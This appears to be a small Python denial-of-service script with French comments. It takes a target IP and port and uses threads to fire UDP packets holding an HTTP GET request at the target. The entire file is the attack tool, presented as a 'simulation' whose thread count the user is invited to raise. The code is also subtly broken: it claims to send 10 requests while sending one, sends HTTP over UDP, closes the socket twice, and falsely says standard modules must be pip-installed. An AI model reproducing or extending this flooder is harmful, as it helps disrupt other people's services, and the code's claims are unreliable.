try:
    import socket  # Importation du module socket pour les connexions réseau
except ImportError:
    print("Le module socket n'est pas installé. Veuillez l'installer en utilisant 'pip install socket'.")
    exit()

try:
    import threading  # Importation du module threading pour la gestion des threads
except ImportError:
    print("Le module threading n'est pas installé. Veuillez l'installer en utilisant 'pip install threading'.")
    exit()

try:
    import sys  # Importation du module sys pour la gestion des arguments et des sorties
except ImportError:
    print("Le module sys n'est pas installé. Veuillez l'installer")
    exit()



# Nombre de requêtes à envoyer
REQUESTS=1  #nombre de threads (request en parallel)



def usage():
    """Affiche l'utilisation correcte du script et quitte le programme."""
    print("Usage: python ddos_simulation.py <IP_TARGET> <PORT>")
    sys.exit()

# Vérification des paramètres d'entrée
if len(sys.argv) != 3:
    usage()

target_ip = sys.argv[1]  # Adresse IP cible
try:
    target_port = int(sys.argv[2])  # Port cible
except ValueError:
    print("Le port doit être un entier.")
    usage()










def attack(target_ip, target_port):
    """Fonction pour envoyer des requêtes massives à l'adresse IP et au port cibles."""
    try:
        
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Création d'un socket UDP
        message = ("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)).encode('ascii')  # Préparation du message
        s.sendto(message, (target_ip, target_port))  # Envoi du message au serveur cible
        s.close()  # Fermeture du socket
        

        # Fermeture du socket
        s.close()
    except Exception as e:
        print(f"Erreur de connexion : {e}")



def start_attack():
    """Démarrage de plusieurs threads pour simuler une charge sur le serveur cible."""
    print("coucou")
    try:
        print(f"Lancement de l'attaque sur {target_ip}:{target_port}")
        print("10 HTTP REQUEST SENT TO THE SERVER")
        for i in range(REQUESTS):  # Ajustez le nombre de threads en fonction de vos besoins
            try:
                
                thread = threading.Thread(target=attack, args=(target_ip, target_port))  # Création d'un thread pour chaque attaque
                thread.start()  # Démarrage du thread
            except Exception as e:
                print(e)


    except KeyboardInterrupt:
        print("\nArrêt manuel de l'attaque.")  # Message affiché en cas d'interruption manuelle
        sys.exit()



start_attack()  



